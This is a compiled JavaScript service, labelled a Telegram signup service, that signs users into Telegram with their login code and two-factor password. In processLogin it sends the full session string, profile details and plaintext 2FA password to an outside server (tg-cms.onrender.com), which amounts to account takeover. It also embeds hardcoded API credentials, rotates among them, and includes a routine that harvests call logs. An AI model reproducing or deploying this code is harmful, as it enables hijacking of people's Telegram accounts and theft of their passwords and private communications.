"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.TgSignupService = void 0;
exports.restAcc = restAcc;
exports.getClient = getClient;
exports.hasClient = hasClient;
exports.deleteClient = deleteClient;
exports.disconnectAll = disconnectAll;
exports.createClient = createClient;
const tl_1 = require("telegram/tl");
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const axios_1 = require("axios");
const Helpers_1 = require("telegram/Helpers");
const Password_1 = require("telegram/Password");
const big_integer_1 = require("big-integer");
const Logger_1 = require("telegram/extensions/Logger");
const utils_1 = require("../../utils");
const common_1 = require("@nestjs/common");
const clients = new Map();
let creds = [
    {
        apiId: 27919939,
        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
    },
    {
        apiId: 25328268,
        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
    },
    {
        apiId: 2899,
        apiHash: "36722c72256a24c1225de00eb6a1ca74"
    },
    {
        apiId: 24559917,
        apiHash: "702294de6c08f4fd8c94c3141e0cebfb"
    },
    {
        apiId: 12777557,
        apiHash: "05054fc7885dcfa18eb7432865ea3500"
    },
    {
        apiId: 27565391,
        apiHash: "a3a0a2e895f893e2067dae111b20f2d9"
    },
    {
        apiId: 23195238,
        apiHash: "15a8b085da74163f158eabc71c55b000"
    },
];
async function restAcc(phoneNumber) {
    await (0, Helpers_1.sleep)(1000);
    console.log("Reset - ", phoneNumber);
    const client = getClient(phoneNumber);
    if (client) {
        await client.client?.destroy();
        await client.client?.disconnect();
        client.client.session.delete();
        client.session.delete();
        client.client._destroyed = true;
        client.client = null;
        delete client['client'];
        await deleteClient(phoneNumber);
    }
}
function getClient(number) {
    return clients.get(number);
}
async function hasClient(number) {
    return clients.has(number);
}
function contains(str, arr) {
    return (arr.some(element => {
        if (str?.includes(element)) {
            return true;
        }
        return false;
    }));
}
;
async function deleteClient(number) {
    console.log("Deleting Client - ", number);
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}
async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        }
        catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}
async function createClient(number) {
    try {
        if (clients.has(number)) {
            console.log("Client already exist");
            const cli = clients.get(number);
            setTimeout(async () => {
                await restAcc(number);
            }, 60000);
            return (await cli.sendCode(false));
        }
        else {
            const randomIndex = Math.floor(Math.random() * creds.length);
            const apiHash = creds[randomIndex].apiHash;
            const apiId = creds[randomIndex].apiId;
            console.log("Creating new client - ", number, creds[randomIndex]);
            const cli = new TgSignupService(number, apiId, apiHash);
            clients.set(number, cli);
            await (0, Helpers_1.sleep)(500);
            return (await cli.sendCode(false));
        }
    }
    catch (error) {
        console.log((0, utils_1.parseError)(error));
        throw new common_1.BadRequestException((0, utils_1.parseError)(error).message);
    }
}
class TgSignupService {
    constructor(number, apiId, apiHash) {
        this.apiId = apiId;
        this.apiHash = apiHash;
        this.phoneNumber = number;
        this.session = new sessions_1.StringSession('');
        this.client = null;
        this.createClient();
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return latest;
    }
    async disconnect() {
        await this.client?.disconnect();
        await this.client?.destroy();
        await this.session.delete();
        this.client = null;
    }
    async createClient() {
        try {
            console.log(this.apiId, this.apiHash);
            this.client = new telegram_1.TelegramClient(this.session, this.apiId, this.apiHash, {
                connectionRetries: 5,
            });
            await this.client.setLogLevel(Logger_1.LogLevel.ERROR);
            await this.client.connect();
        }
        catch (error) {
            console.log("Error while Connecting:", error);
        }
    }
    async deleteMessages() {
        console.log("DeleteMessages TODO");
    }
    async sendCode(forceSMS = false) {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, this.apiId, this.apiHash);
            try {
                const sendResult = await this.client.invoke(new tl_1.Api.auth.SendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    apiId: this.apiId,
                    apiHash: this.apiHash,
                    settings: new tl_1.Api.CodeSettings({}),
                }));
                console.log('Send result - ', sendResult);
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 150000);
                if (sendResult instanceof tl_1.Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after sending the code");
                this.phoneCodeHash = sendResult.phoneCodeHash;
                if (!forceSMS || sendResult.type instanceof tl_1.Api.auth.SentCodeTypeSms) {
                    return {
                        phoneCodeHash: sendResult.phoneCodeHash,
                        isCodeViaApp: sendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
                    };
                }
                const resendResult = await this.client.invoke(new tl_1.Api.auth.ResendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: sendResult.phoneCodeHash,
                }));
                console.log('ReSend result - ', sendResult);
                if (resendResult instanceof tl_1.Api.auth.SentCodeSuccess)
                    throw new Error("logged in right after resending the code");
                this.phoneCodeHash = resendResult.phoneCodeHash;
                return {
                    phoneCodeHash: resendResult.phoneCodeHash,
                    isCodeViaApp: resendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
                };
            }
            catch (sendCodeError) {
                console.log("Error in sending code:", sendCodeError);
                throw sendCodeError;
            }
        }
        catch (err) {
            if (err.errorMessage === "AUTH_RESTART") {
                try {
                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);
                }
                catch (error) {
                    console.log("heelo: ", error);
                }
            }
            else {
                console.log(err);
            }
        }
    }
    async login(phoneCode, passowrd) {
        let isRegistrationRequired = false;
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(new tl_1.Api.auth.SignIn({
                phoneNumber: `+${this.phoneNumber}`,
                phoneCodeHash: this.phoneCodeHash,
                phoneCode
            }));
            if (result instanceof tl_1.Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            }
            else {
                this.processLogin(result.user);
                await restAcc(this.phoneNumber);
                return { status: 200, message: "Login success" };
            }
        }
        catch (err) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required");
                try {
                    const passwordSrpResult = await this.client.invoke(new tl_1.Api.account.GetPassword());
                    const passwordSrpCheck = await (0, Password_1.computeCheck)(passwordSrpResult, passowrd);
                    const { user } = (await this.client.invoke(new tl_1.Api.auth.CheckPassword({
                        password: passwordSrpCheck,
                    })));
                    this.processLogin(user, passowrd);
                    return { status: 200, message: "Login success" };
                }
                catch (error) {
                    return { status: 400, message: "2FA required" };
                }
            }
            else {
                const shouldWeStop = false;
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            await restAcc(this.phoneNumber);
            return { status: 400, message: err.errorMessage };
        }
        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(new tl_1.Api.auth.SignUp({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    firstName,
                    lastName,
                })));
                if (termsOfService) {
                    await this.client.invoke(new tl_1.Api.help.AcceptTermsOfService({
                        id: termsOfService.id,
                    }));
                }
                return user;
            }
            catch (err) {
                const shouldWeStop = false;
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
        await restAcc(this.phoneNumber);
    }
    async getCallLogs() {
        try {
            const result = await this.client.invoke(new tl_1.Api.messages.Search({
                peer: new tl_1.Api.InputPeerEmpty(),
                q: '',
                filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 100,
                maxId: 0,
                minId: 0,
                hash: big_integer_1.default.zero,
            }));
            console.log("Got Messages");
            const callLogs = result.messages.filter(message => message.action instanceof tl_1.Api.MessageActionPhoneCall);
            console.log("filtered call logs");
            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                chatCallCounts: {},
                totalCalls: 0
            };
            for (const log of callLogs) {
                try {
                    filteredResults.totalCalls++;
                    const callInfo = {
                        callId: log.action.callId.value,
                        duration: log.action.duration,
                        video: log.action.video,
                        timestamp: log.date
                    };
                    console.log(callInfo);
                    if (log.out) {
                        filteredResults.outgoing++;
                    }
                    else {
                        filteredResults.incoming++;
                    }
                    if (log.action.video) {
                        filteredResults.video++;
                    }
                    const chatId = log.peerId.userId.value;
                    if (!filteredResults.chatCallCounts[chatId]) {
                        console.log("Getting Enitity", chatId);
                        let ent = { firstName: 'Default', lastName: null };
                        try {
                            ent = await this.client.getInputEntity(chatId);
                            console.log("Got Enitity", chatId);
                        }
                        catch (error) {
                            console.log("Failed to get entity for chatId:", chatId, error);
                        }
                        filteredResults.chatCallCounts[chatId] = {
                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                            count: 0
                        };
                    }
                    else {
                        console.log(chatId, ' Already exists');
                    }
                    filteredResults.chatCallCounts[chatId].count++;
                }
                catch (error) {
                    console.log("Error processing log:", log, error);
                }
            }
            console.log('Returning filtered results', filteredResults);
            return filteredResults;
        }
        catch (error) {
            console.error("Error in getCallLogs:", error);
            throw error;
        }
    }
    async processLogin(result, passowrd = undefined) {
        console.log(this.client.session.save());
        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const sess = this.client.session.save();
        const user = await result.toJSON();
        let channels = 0;
        const chatsArray = [];
        let personalChats = 0;
        console.log("AllGood");
        const payload3 = {
            photoCount, videoCount, movieCount,
            gender: null,
            mobile: user.phone,
            session: `${sess}`,
            firstName: user.firstName,
            lastName: user.lastName,
            userName: user.username,
            channels: channels,
            personalChats: personalChats,
            calls: {},
            contacts: 0,
            msgs: 0,
            totalChats: 0,
            lastActive: new Date().toISOString().split('T')[0],
            tgId: user.id
        };
        if (passowrd) {
            payload3['twoFA'] = true;
            payload3['password'] = passowrd;
        }
        console.log("Calculated results");
        try {
            const url = `https://tg-cms.onrender.com/user`;
            console.log("posting results : ", url);
            await axios_1.default.post(url, payload3, { headers: { 'Content-Type': 'application/json' } });
        }
        catch (error) {
            console.log("Error Occured 1");
            console.log(error);
        }
        await this.disconnect();
        await deleteClient(this.phoneNumber);
    }
}
exports.TgSignupService = TgSignupService;
//# sourceMappingURL=TgSignup.service.js.map